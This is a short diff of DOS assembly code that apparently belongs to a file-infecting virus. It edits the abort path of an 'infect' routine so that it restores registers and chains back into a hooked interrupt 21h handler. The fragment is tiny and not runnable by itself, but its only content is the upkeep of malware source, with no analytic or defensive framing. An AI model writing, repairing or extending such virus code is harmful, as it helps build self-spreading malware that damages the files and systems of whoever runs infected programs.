@@ -158,7 +158,9 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      pop bx
 
 .abort_infection:
-     jmp new_int21.restore_state
+     pop bp
+     popa
+     jmp new_int21.call_int21
 
 
 
